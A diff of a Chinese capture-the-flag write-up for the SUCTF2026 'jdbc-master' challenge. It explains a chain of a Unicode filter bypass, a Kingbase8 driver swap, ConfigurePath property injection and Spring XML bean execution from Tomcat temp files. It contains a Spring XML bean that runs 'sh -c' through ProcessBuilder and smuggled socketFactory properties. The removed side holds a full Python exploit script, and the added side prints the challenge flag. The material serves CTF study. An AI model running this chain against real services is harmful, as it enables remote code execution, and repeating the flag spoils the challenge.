@@ -1,660 +1,259 @@
 # SUCTF2026-jdbc-master
 
 ## 题目简述
-题目是 Spring Boot/JDBC 攻击。附件包含 `app.jar`、PostgreSQL/Kingbase 驱动和 Dockerfile，关键机制在反编译出的控制器、拦截器和 datasource 配置。入口路径含 `suctf` 字符串过滤，可用 Unicode 长 s `ſ` 绕过；后端允许影响 JDBC driver/URL，结合 PostgreSQL JDBC 特性和 Spring XML beans 无外连利用，达到任意文件写入或 bean 加载执行。
 
-## 解题过程
-本文学习于：
-
-$$
-https://su18.org/post/postgresql-jdbc-attack-and-stuff/#2-postgresql-jdbc-
-$$
-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5
-
-$$
-https://www.leavesongs.com/PENETRATION/springboot-xml-beans-exploit-without-
-$$
-network.html
-
-入口和路径绕过
-
-控制器注解很直接：
-
-```
-@Controller
-@RequestMapping("/api/connection")
-public class ConnectionTestController {
-@PostMapping("/suctf")
-@ResponseBody
-public Map<String, Object> testConnection(@RequestBody String
-configurationJson) {
-...
-}
-}
-```
-
-拦截器的核心逻辑如下：
-
-```java
-public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler)
-        throws Exception {
-    String servletPath = request.getServletPath();
-    if (servletPath.matches("(?i).*s\\W*u\\W*c\\W*t\\W*f.*")
-            || servletPath.toLowerCase().contains("suctf")) {
-        response.setStatus(403);
-        response.getWriter().write("blocked by filter");
-        return false;
-    }
-    return true;
-}
-```
-
-这里直接用unicode绕过%C5%BF 是长 s ſ 。这条路径可以命中 @PostMapping("/suctf") ，
-但不会被上面三条字符串检查当成字面 suctf 拦掉。
-
-默认 driver 可覆盖
-
-Pg 这个 DTO 只是构造时给了默认值：
-
-``` 
-public class Pg extends DatasourceConfiguration {
-private String driver;
-private String extraParams;
-
-public Pg() {
-this.driver = "org.postgresql.Driver";
-this.extraParams = "";
-}
-
-public String getDriver() {
-return this.driver;
-}
-
-public void setDriver(String driver) {
-this.driver = driver;
-}
-}
-```
-
-后端不会把它锁死回 org.postgresql.Driver ，而是直接吃用户传入的值。
-
-真正加载驱动的逻辑在 ConnectionTestService.testConnection() ：
-
-```
-public boolean testConnection(String json) {
-DatasourceConfiguration conf = (DatasourceConfiguration)
-objectMapper.readValue(json, Pg.class);
-Properties props = new Properties();
-
-if (conf.getUsername() != null && !conf.getUsername().trim().isEmpty()) {
-props.setProperty("user", conf.getUsername());
-}
-if (conf.getPassword() != null && !conf.getPassword().trim().isEmpty()) {
-props.setProperty("password", conf.getPassword());
-}
-
-String jdbc = conf.getJdbc();
-validateJdbcUrl(jdbc);
-
-String driver = conf.getDriver();
-Class<?> clazz = driverClassLoader.loadClass(driver);
-Driver d = (Driver) clazz.newInstance();
-Connection c = d.connect(jdbc, props);
-...
-}
-```
-
-所以这里直接改：
-
-```
-{
-"driver": "com.kingbase8.Driver"
-
-}
-```
-
-URL 校验和参数黑名单
-
-validateJdbcUrl() 的代码就是这几条：
-
-```
-private void validateJdbcUrl(String jdbcUrl) throws
-UnsupportedEncodingException {
-if (jdbcUrl == null || jdbcUrl.trim().isEmpty()) {
-throw new IllegalArgumentException("jdbcUrl is empty");
-}
-
-if (jdbcUrl.trim().toLowerCase().contains(":/")
-|| jdbcUrl.trim().toLowerCase().contains("/?")) {
-throw new IllegalArgumentException("Cannot contain special
-characters");
-}
-
-String lower = jdbcUrl.toLowerCase();
-for (String p : ILLEGAL_PARAMETERS) {
-if (lower.contains(p.toLowerCase())) {
-throw new IllegalArgumentException("Illegal parameter:" + p);
-}
-}
-}
-```
-
-黑名单常量：
-
-```
-static {
-ILLEGAL_PARAMETERS = Arrays.asList(
-"socketFactory",
-"socketFactoryArg",
-"sslfactory",
-"sslhostnameverifier",
-"sslpasswordcallback",
-"authenticationPluginClassName",
-"loggerFile",
-"loggerLevel"
-);
-}
-```
-
-这里有两个关键点：
-
-1. 它只拦首层 URL。
-
-2. 它只是在字符串里找 :/ 和 /? 。
-
-所以 query-only URL 可以直接过：
-
-$$
-jdbc:kingbase8:?ConfigurePath=...
-$$
-
-这条 URL 没有 :/ 和 /? ，也没有首层的危险参数名。
-
-Kingbase
-
-首先Kingbase是国产基于postgresql研发的一个引擎com.kingbase8.Driver.connect() 里
-有一段非常关键：
-
-```
-public Connection connect(String url, Properties info) throws SQLException {
-...
-props = parseURL(url, props);
-if (props == null) {
-return null;
-}
-
-if (KBProperty.CONFIGUREPATH.get(props) != null) {
-props = initJDBCCONF(props);
-}
-
-setupLoggerFromProperties(props);
-return makeConnection(url, props);
-}
-```
-
-initJDBCCONF() 直接调用：
-
-```
-public static Properties initJDBCCONF(Properties props) throws Exception {
-return loadPropertyFiles(KBProperty.CONFIGUREPATH.get(props), props);
-}
-```
-
-```
-public static Properties loadPropertyFiles(String fileName, Properties props)
-throws IOException {
-Properties newProps = new Properties(props);
-File file = getFile(fileName);
-
-if (!file.exists()) {
-throw new IOException("Configuration file " + file.getAbsolutePath() +
-" does not exist...");
-}
-newProps.load(new FileInputStream(file));
-return newProps;
-}
-```
-
-也就是说，只要：
-
-ConfigurePath=/某个可读文件
-
-这份文件里的内容就会在驱动内部被重新 merge 进 Properties 。这一步已经不受应用层黑名单控
-制了。
-
-Spring 接入
-
-SocketFactoryFactory.getSocketFactory() ：
-
-```
-public static SocketFactory getSocketFactory(Properties props) throws
-KSQLException {
-String socketFactoryClassName = KBProperty.SOCKET_FACTORY.get(props);
-if (socketFactoryClassName == null) {
-return SocketFactory.getDefault();
-}
-
-try {
-return (SocketFactory) ObjectFactory.instantiate(
-socketFactoryClassName,
-props,
-true,
-KBProperty.SOCKET_FACTORY_ARG.get(props)
-);
-} catch (Exception ex) {
-throw new KSQLException(
-"The SocketFactory class provided {0} could not be instantiated.",
-KSQLState.CONNECTION_FAILURE,
-ex
-);
-}
-}
-
-ObjectFactory.instantiate() ：
-
-public static Object instantiate(String className, Properties info, boolean
-tryString, String arg)
-throws ClassNotFoundException, NoSuchMethodException,
-InstantiationException,
-IllegalAccessException, InvocationTargetException {
-Object[] ctorArgs = new Object[] { info };
-Constructor ctor = null;
-Class<?> cls = Class.forName(className);
-
-try {
-ctor = cls.getConstructor(Properties.class);
-} catch (NoSuchMethodException e) {
-if (tryString) {
-try {
-ctor = cls.getConstructor(String.class);
-ctorArgs = new String[] { arg };
-} catch (NoSuchMethodException e2) {
-tryString = false;
-}
-}
-if (!tryString) {
-ctor = cls.getConstructor((Class[]) null);
-ctorArgs = null;
-}
-}
-
-return ctor.newInstance(ctorArgs);
-}
-```
-
-这就是链子的核心：
-
-1. socketFactory 能指定任意类
-
-2. 优先尝试 (Properties) 构造
-
-3. 没有就尝试 (String) 构造
-
-4. 再没有才走无参构造
-
-5. 实例化完成之后才 cast 成 SocketFactory
-
-所以二阶段配置里只要写：
-
-```
-socketFactory=org.springframework.context.support.FileSystemXmlApplicationConte
-```
-
-xt
-
-```
-socketFactoryArg=file:/.../payload.xml
-```
-
-就会先执行：
-
-$$
-new FileSystemXmlApplicationContext("file:/.../payload.xml")
-$$
-
-然后才在外层因为不能 cast 成 SocketFactory 报错。
-
-报错不重要，副作用已经发生了。
-
-最关键的一部分：两个临时文件
-
-这里直接说结论：因为一份文件必须给 ConfigurePath 当 properties 读，另一份文件必须给
-Spring 当 XML 读。
-
-这两种格式不能混。
-
-具体是：
-
-第一份文件：
+题目提供一个 Spring Boot 的 JDBC 连通性测试接口，同时打包了 PostgreSQL 42.3.6 与 Kingbase8 8.6 驱动。利用链不是直接套 PostgreSQL 旧版 PoC，而是依次突破四层限制：
 
 ```text
+Unicode 路由差异绕过拦截器
+  -> JSON 覆盖默认 driver
+  -> Kingbase8 ConfigurePath 二次加载隐藏参数
+  -> Tomcat multipart 临时文件提供本地载体
+  -> 未校验类型的 socketFactory 实例化 Spring XML
+  -> 不出网执行并回显 flag
+```
+
+官方单题 WP 的主线把第一份临时文件构造成 XML/Properties 双用途文件，再由第二份 XML 加载内存马；总 WP 给出了一条更容易核验的替代路线：分别保留 properties 与 XML 文件，用 `ProcessBuilder` 把 `/flag` 写入 Tomcat docBase 后直接 HTTP 读取。下面以官方链条为主，同时保留后者作为无需内存马的回显方案。
+
+## 解题过程
+
+### 1. 利用 `ſ` 在过滤与路由之间制造语义差异
+
+接口实际映射为：
+
+```java
+@RequestMapping("/api/connection")
+@PostMapping("/suctf")
+public Map<String, Object> testConnection(@RequestBody String json) {
+    // ...
+}
+```
+
+`PathInterceptor` 会对 `servletPath` 做三次检查：
+
+```java
+servletPath.matches("(?i).*s\\W*u\\W*c\\W*t\\W*f.*")
+servletPath.toLowerCase().contains("suctf")
+servletPath.toLowerCase()
+           .replaceAll("[^a-z0-9]", "")
+           .contains("suctf")
+```
+
+但 Web 配置又把 Spring 路由匹配设为大小写不敏感。Unicode 长 s `ſ` 在这里产生了关键差异：
+
+- Java `equalsIgnoreCase` 会把 `ſ` 与 `s` 视为可匹配字符，因为 `ſ` 的大写形式为 `S`；
+- `(?i)` 未启用 `UNICODE_CASE` 时主要按 ASCII 大小写处理，不会把 `ſ` 当成 `s`；
+- `ſ`.toLowerCase() 仍是 `ſ`，第二项找不到字面 `suctf`；
+- 第三项的 ASCII 白名单会删除 `ſ`，得到 `uctf`，仍不命中。
+
+因此下面的路径能进入 `/suctf` 控制器，却不会被拦截器阻止：
+
+```text
+POST /api/connection/%C5%BFuctf
+```
+
+总 WP 的脚本在末尾加了矩阵参数 `;foo=1`，但官方利用并不依赖它；核心仍是 `%C5%BF` 解码后的 `ſ`。
+
+### 2. 覆盖默认 JDBC 驱动
+
+`Pg` DTO 构造时把驱动设为：
+
+```java
+this.driver = "org.postgresql.Driver";
+```
+
+这只是默认值，并非不可修改的常量。控制器使用 Jackson 将用户 JSON 反序列化成 `Pg`：对象先构造，再调用 setter 写入 JSON 中出现的字段，所以攻击者可以用 `driver` 字段覆盖默认值。
+
+`ConnectionTestService` 随后直接加载并实例化该类：
+
+```java
+DatasourceConfiguration conf = objectMapper.readValue(json, Pg.class);
+Class<?> clazz = driverClassLoader.loadClass(conf.getDriver());
+Driver driver = (Driver) clazz.newInstance();
+driver.connect(conf.getJdbc(), props);
+```
+
+于是可将驱动切换为附件中已经存在的 Kingbase8：
+
+```json
+{
+  "urlType": "jdbcUrl",
+  "driver": "com.kingbase8.Driver",
+  "jdbcUrl": "jdbc:kingbase8:?ConfigurePath=...",
+  "username": "a",
+  "password": "b"
+}
+```
+
+PostgreSQL 42.3.6 已不受 CVE-2022-21724 原始链影响；题目放入 Kingbase8 的意义，是其 `SocketFactoryFactory` 仍保留“先实例化、后强制转换”的旧逻辑。
+
+### 3. 用 `ConfigurePath` 绕过首层 URL 黑名单
+
+应用层 `validateJdbcUrl` 会拒绝：
+
+- URL 中的 `:/` 和 `/?`；
+- `socketFactory`、`socketFactoryArg`、`sslfactory`、`loggerFile`、`loggerLevel` 等危险参数名。
+
+Kingbase8 允许省略主机、端口和数据库路径，使用只有 query 的 URL：
+
+```text
+jdbc:kingbase8:?ConfigurePath=/proc/self/fd/N
+```
+
+这个字符串没有 `:/` 或 `/?`，首层也没有出现被禁参数。驱动的 `connect` 解析 URL 后会检查 `ConfigurePath`：
+
+```java
+if (KBProperty.CONFIGUREPATH.get(props) != null) {
+    props = initJDBCCONF(props);
+}
+```
+
+`initJDBCCONF` 最终对指定本地文件执行 `Properties.load(new FileInputStream(file))`，把其中的键值重新合并进驱动属性。应用黑名单只审查了外层 JDBC URL，并不会再检查配置文件内容，所以第二阶段文件可以重新引入：
+
+```properties
+socketFactory=org.springframework.context.support.FileSystemXmlApplicationContext
+socketFactoryArg=file:/path/to/payload.xml
+```
+
+这也是为什么不能把 `ConfigurePath` 简化成“任意文件读取”：真正需要的是它作为未经过滤的二阶段属性入口。
+
+### 4. 从 Kingbase8 的类型检查顺序到 Spring XML 执行
+
+Kingbase8 根据 `socketFactory` 反射实例化类时，优先寻找 `(Properties)` 构造器，失败后尝试 `(String)`，最后才尝试无参构造器；对象创建完成后才强制转换成 `SocketFactory`。概括如下：
+
+```java
+Class<?> cls = Class.forName(className);
+try {
+    ctor = cls.getConstructor(Properties.class);
+} catch (NoSuchMethodException e) {
+    ctor = cls.getConstructor(String.class);
+    ctorArgs = new String[]{arg};
+}
+Object object = ctor.newInstance(ctorArgs);
+return (SocketFactory) object;
+```
+
+`FileSystemXmlApplicationContext` 有接收字符串路径的构造器。指定它后，会先执行：
+
+```java
+new FileSystemXmlApplicationContext("file:/path/to/payload.xml")
+```
+
+Spring 已经完成 XML 解析和 bean 初始化，外层才因对象不能转换为 `SocketFactory` 报错；该异常不会撤销 XML 产生的副作用。
+
+[pgjdbc 的修复提交](https://github.com/pgjdbc/pgjdbc/commit/f4d0ed69c0b3aae8531d83d6af4c57f22312c813)展示了相反的安全顺序：先要求加载的类是 `SocketFactory` 的子类，再进行实例化。Kingbase8 此处缺少这项预验证，才保留了与 CVE-2022-21724 同类的利用原语。
+
+### 5. 用未完成 multipart 请求制造本地临时文件
+
+题目通过 Java SecurityManager 禁止向外主动连接，所以不能让 `socketFactoryArg` 指向攻击者 HTTP 服务器。可利用 Tomcat 处理 multipart 时的磁盘缓存：
+
+1. 建立原始 TCP 连接并发送 `multipart/form-data` 请求头；
+2. 声明很大的 `Content-Length`，发送足以超过内存阈值的文件内容；
+3. 故意不发送完整请求并保持连接，使临时文件和对应 fd 持续存在。
+
+文件通常落在：
+
+```text
+/tmp/tomcat.8080.<随机值>/work/Tomcat/localhost/ROOT/
+  upload_<uuid>_00000000.tmp
+  upload_<uuid>_00000001.tmp
+```
+
+同时，Java 进程的 `/proc/self/fd/N` 会指向这些文件。fd 编号受运行状态影响，官方脚本在一个小范围内并发尝试；范围只是经验参数，不是漏洞固定值。
+
+需要两类内容载体：
+
+- Kingbase8 先把一份文件按 Java Properties 读取；
+- `FileSystemXmlApplicationContext` 再把 XML 按 Spring bean 配置读取。
+
+如果两份文件都是普通单一格式，又让 Spring 通过宽泛通配符加载目录中的全部 `.tmp`，properties 文件会因不是合法 XML 而使解析失败。官方解法用一个多语文件解决了这个冲突。
+
+### 6. 官方主线：XML/Properties 双用途文件
+
+第一份临时文件本身是合法 Spring XML，同时在 XML 属性值的独立行中嵌入两条合法 Properties：
+
+```xml
 <?xml version="1.0" encoding="UTF-8"?>
 <beans xmlns="http://www.springframework.org/schema/beans"
-xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
-xsi:schemaLocation="
-http://www.springframework.org/schema/beans
-https://www.springframework.org/schema/beans/spring-beans.xsd">
-<bean id="pb" class="java.lang.ProcessBuilder" init-method="start">
-<constructor-arg>
-<list>
-<value>sh</value>
-<value>-c</value>
-<value>for d in /tmp/tomcat-docbase.8080.*; do cat /flag >
-"$d"/flag.txt; done</value>
-</list>
-</constructor-arg>
-</bean>
+       xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
+       xsi:schemaLocation="http://www.springframework.org/schema/beans
+       http://www.springframework.org/schema/beans/spring-beans.xsd">
+  <bean id="poc" class="java.lang.String">
+    <constructor-arg value="
+socketFactory=org.springframework.context.support.FileSystemXmlApplicationContext
+socketFactoryArg=file:/${catalina.home}/**/*.tmp
+    "/>
+  </bean>
 </beans>
 ```
 
+`Properties.load` 会提取两条 `key=value`；Spring 把同一文件当 XML 时，它又只是创建一个无害的字符串 bean。这样 `**/*.tmp` 即使同时匹配第一份文件，也不会因 XML 格式错误而中断。
+
+第二份临时文件才是实际执行载荷。官方附件 `exp.xml` 的结构是：
+
+1. Base64 解码内存马 class 字节；
+2. 通过 `javax.management.loading.MLet#defineClass` 定义类；
+3. 实例化该类，把监听逻辑注入当前 Tomcat/Spring 进程。
+
+完整 Base64 class 很长，且依赖具体中间件版本，不应把它当作通用常量；复现时直接使用官方 `exp/exp.xml`，或按目标版本重新生成。关键是载荷完全来自本地临时文件，不需要目标出网。
+
+官方脚本的时序为：
+
+```text
+保持连接 A -> 缓存双用途 evil.txt
+保持连接 B -> 缓存真正的 exp.xml
+循环请求    -> ConfigurePath=/proc/self/fd/N
+命中 fd     -> 读出隐藏属性
+Spring 通配 -> 同时解析两个合法 XML
+实例化载荷  -> 内存马生效
 ```
+
+### 7. 替代路线：分离两份文件并直接写 docBase
+
+总 WP 没有使用内存马，而是令第二份 XML 创建并启动 `ProcessBuilder`：
+
+```xml
+<bean id="pb" class="java.lang.ProcessBuilder" init-method="start">
+  <constructor-arg>
+    <list>
+      <value>sh</value>
+      <value>-c</value>
+      <value>for d in /tmp/tomcat-docbase.8080.*;
+             do cat /flag &gt; "$d/flag.txt"; done</value>
+    </list>
+  </constructor-arg>
+</bean>
+```
+
+第一份纯 properties 文件则指定一个只命中 XML 临时文件的模式：
+
+```properties
 loggerLevel=DEBUG
 loggerFile=/proc/self/fd/1
-socketFactory=org.springframework.context.support.FileSystemXmlApplicationConte
-```
-
-xt
-
-```
+socketFactory=org.springframework.context.support.FileSystemXmlApplicationContext
 socketFactoryArg=file:/tmp/tomcat.*/work/Tomcat/localhost/ROOT/*00000000.tmp
 ```
 
-这两份东西如果硬塞进一个文件里，ConfigurePath 读不通，Spring 也读不通。
+由于这份 properties 自身不是合法 XML，通配符不能写成 `*.tmp`，否则 Spring 会把它也当 XML 解析。脚本先挂起 XML 上传，再挂起 properties 上传，以期 XML 获得 `00000000.tmp`；这个编号依赖干净环境和创建顺序，应在本地验证，必要时收窄到实际后缀。
 
-所以从结构上就决定了必须要两份内容载体。
+命中 properties 对应 fd 后，XML 会把 `/flag` 写到 Tomcat docBase。随后直接请求：
 
-为什么 XML 不能继续用 fd
-
-一开始很自然会想到：
-
-$$
-socketFactoryArg=file:/proc/self/fd/xx
-$$
-
-但这样会有两个问题：
-
-1. 外层 ConfigurePath=/proc/self/fd/<n> 已经要爆一次 fd
-
-2. 内层 XML 再写 /proc/self/fd/<m> ，就变成同一次利用里同时命中两组不稳定 fd
-
-所以最后必须把 XML 这一层从 fd 爆破换成路径通配符。
-
-真正能用的是：
-
-$$
-socketFactoryArg=file:/tmp/tomcat.*/work/Tomcat/localhost/ROOT/*0000000
-$$
-0.tmp
-
-注意这里不能写成：
-
-$$
-socketFactoryArg=file:/tmp/tomcat.*/work/Tomcat/localhost/ROOT/*.tmp
-$$
-
-因为 *.tmp 会把目录里所有上传 tmp 都交给 Spring 当 XML 解析。到时 properties 那份 tmp 也会
-被一起当 XML 读，直接报错。
-
-所以这里必须收窄到只命中 XML 那份文件。我的做法是：
-
-1. 先挂 XML
-
-2. 再挂 properties
-
-这样 fresh 环境里：
-
-是 XML• 00000000.tmp
-
-是 properties• 00000001.tmp
-
-于是 *00000000.tmp 才是安全的。
-
-Tomcat 临时文件和 fd利用
-
-利用依赖 Tomcat multipart 临时文件。
-
-发大体积 multipart 请求，并故意不发完，Tomcat 会先落盘：
-
-```
-/tmp/tomcat.8080.<随机数>/work/Tomcat/localhost/ROOT/upload_<uuid>_00000000.tmp
-/tmp/tomcat.8080.<随机数>/work/Tomcat/localhost/ROOT/upload_<uuid>_00000001.tmp
+```text
+GET /flag.txt
 ```
 
-同时 Java 进程里会出现对应 fd，比如本地实测：
+即可回显 flag。这条路线省掉内存马和二次交互，更适合作为最小验证链；官方多语文件路线则避免了依赖临时文件序号的窄匹配。
 
-```
-/proc/8/fd/29 -> ...00000000.tmp
-/proc/8/fd/31 -> ...00000001.tmp
-```
+官方仓库给出的静态 flag 为：
 
-最后只需要爆 properties 那个 fd 即可。
-
-docBase回显
-
-直接写 Tomcat docBase：
-
-/tmp/tomcat-docbase.8080.<随机数>/
-
-因为这个目录里的文件可以直接 HTTP 访问。实测在这里写：
-
-/tmp/tomcat-docbase.8080.<随机数>/flag.txt
-
-之后直接：
-
-GET /flag.txt ，就能把内容读回来，这比 socket 回写稳很多。
-
-### exp
-
-```python
-import argparse
-import json
-import socket
-import sys
-import threading
-import time
-from pathlib import Path
-
-REQUEST_PATH = "/api/connection/%C5%BFuctf;foo=1"
-XML_MATCH = "*00000000.tmp"
-
-class UploadHolder:
-def __init__(self, host: str, port: int, filename: str, content_type: str,
-body: bytes):
-self.host = host
-self.port = port
-self.filename = filename
-self.content_type = content_type
-self.body = body
-self.sock = None
-self.thread = threading.Thread(target=self._run, daemon=True)
-
-def start(self) -> None:
-self.thread.start()
-
-def _run(self) -> None:
-try:
-sock = socket.create_connection((self.host, self.port),
-timeout=3.0)
-self.sock = sock
-headers = (
-f"POST {REQUEST_PATH} HTTP/1.1\r\n"
-f"Host: {self.host}:{self.port}\r\n"
-"Content-Type: multipart/form-data; boundary=foo\r\n"
-"Content-Length: 1000000\r\n"
-"Connection: keep-alive\r\n"
-"\r\n"
-"--foo\r\n"
-f'Content-Disposition: form-data; name="a"; filename="
-{self.filename}"\r\n'
-f"Content-Type: {self.content_type}\r\n"
-"\r\n"
-).encode("ascii")
-sock.sendall(headers)
-sock.sendall(self.body)
-sock.sendall(b" " * 131072)
-time.sleep(90)
-except OSError:
-pass
-finally:
-if self.sock is not None:
-try:
-self.sock.close()
-except OSError:
-pass
-
-def stop(self) -> None:
-if self.sock is not None:
-try:
-self.sock.close()
-except OSError:
-pass
-
-def recv_all(sock: socket.socket, timeout: float) -> bytes:
-sock.settimeout(timeout)
-chunks = []
-while True:
-try:
-data = sock.recv(4096)
-except socket.timeout:
-
-break
-if not data:
-break
-chunks.append(data)
-return b"".join(chunks)
-
-def raw_http(
-host: str,
-port: int,
-method: str,
-path: str,
-headers: dict[str, str],
-body: bytes = b"",
-timeout: float = 2.0,
-) -> bytes:
-sock = socket.create_connection((host, port), timeout=timeout)
-try:
-request = [f"{method} {path} HTTP/1.1", f"Host: {host}:{port}"]
-for key, value in headers.items():
-request.append(f"{key}: {value}")
-request.append("")
-request.append("")
-sock.sendall("\r\n".join(request).encode("ascii") + body)
-return recv_all(sock, timeout)
-finally:
-try:
-sock.close()
-except OSError:
-pass
-
-def trigger_fd(host: str, port: int, fd: int) -> None:
-body = json.dumps(
-{
-"urlType": "jdbcUrl",
-"jdbcUrl": f"jdbc:kingbase8:?ConfigurePath=/proc/self/fd/{fd}",
-"username": "a",
-"password": "b",
-"driver": "com.kingbase8.Driver",
-},
-separators=(",", ":"),
-).encode("utf-8")
-try:
-raw_http(
-host,
-port,
-
-"POST",
-REQUEST_PATH,
-{
-"Content-Type": "application/json",
-"Content-Length": str(len(body)),
-"Connection": "close",
-},
-body,
-timeout=2.0,
-)
-except OSError:
-pass
-
-def fetch_flag(host: str, port: int) -> str:
-try:
-response = raw_http(
-host,
-port,
-"GET",
-"/flag.txt",
-{"Connection": "close"},
-timeout=2.0,
-)
-except OSError:
-return ""
-if b"\r\n\r\n" not in response:
-return ""
-return response.split(b"\r\n\r\n", 1)[1].decode("utf-8", "ignore").strip()
-
-def exploit_port(host: str, port: int, xml_payload: bytes) -> str:
-props = (
-"loggerLevel=DEBUG\n"
-"loggerFile=/proc/self/fd/1\n"
-
-"socketFactory=org.springframework.context.support.FileSystemXmlApplicationCont
+```text
+suctf{u5Ing_JdbC_70_rce_iS_vEry_s1mpl3!_!!}
 ```
 
-ext\n"
-
-```python
-f"socketFactoryArg=file:/tmp/tomcat.*/work/Tomcat/localhost/ROOT/{XML_MATCH}\n"
-).encode("utf-8")
-
-holders = [
-UploadHolder(host, port, "x.xml", "text/xml", xml_payload),
-UploadHolder(host, port, "x.properties", "text/plain", props),
-]
-try:
-
-holders[0].start()
-time.sleep(1.0)
-holders[1].start()
-time.sleep(1.0)
-
-for fd in range(24, 41):
-trigger_fd(host, port, fd)
-flag = fetch_flag(host, port)
-if "suctf{" in flag:
-return flag
-return ""
-finally:
-for holder in holders:
-holder.stop()
-
-def main() -> int:
-parser = argparse.ArgumentParser()
-parser.add_argument("host", nargs="?", default="<target>")
-parser.add_argument("ports", nargs="*", type=int, default=[10018, 10019,
-10020])
-args = parser.parse_args()
-
-xml_path = Path(__file__).with_name("kingbase_docbase_flag.xml")
-if not xml_path.exists():
-print(f"missing xml payload: {xml_path}", file=sys.stderr)
-return 1
-xml_payload = xml_path.read_bytes()
-
-for port in args.ports:
-print(f"[*] trying {args.host}:{port}", file=sys.stderr, flush=True)
-flag = exploit_port(args.host, port, xml_payload)
-if flag:
-print(flag)
-return 0
-
-print("flag not found", file=sys.stderr)
-return 1
-
-if __name__ == "__main__":
-raise SystemExit(main())
-```
+平台动态环境应以实际读取结果为准。
 
 ## 方法总结
-- 核心技巧：JDBC URL/driver 攻击 + Spring 解析链
-- 识别信号：可控 JDBC 参数、存在 PostgreSQL/Kingbase 驱动、路径过滤有 Unicode 差异。
-- 复用要点：先绕过路由过滤进入接口，再利用 JDBC 驱动特性写文件或触发 Spring XML bean。
+
+本题的核心是多层解析边界不一致：拦截器和 Spring 路由对 Unicode 大小写的理解不同，DTO 默认值可以被 Jackson 字段覆盖，应用只检查第一层 JDBC URL，而 Kingbase8 又从 `ConfigurePath` 加载第二层属性，最后驱动在验证接口类型之前就执行了攻击者指定类的构造器。
+
+不出网条件下，Tomcat 临时文件同时解决了“如何把 properties 放到本地”和“如何把 Spring XML 放到本地”两个问题。官方多语文件让宽通配符下的所有载体都保持 XML 合法；替代路线则用精确文件名把两种格式隔离。复现时最值得逐项观测的是路由是否真正进入控制器、临时文件路径与 fd、`ConfigurePath` 是否读取成功，以及 Spring 通配符最终匹配了哪些文件。
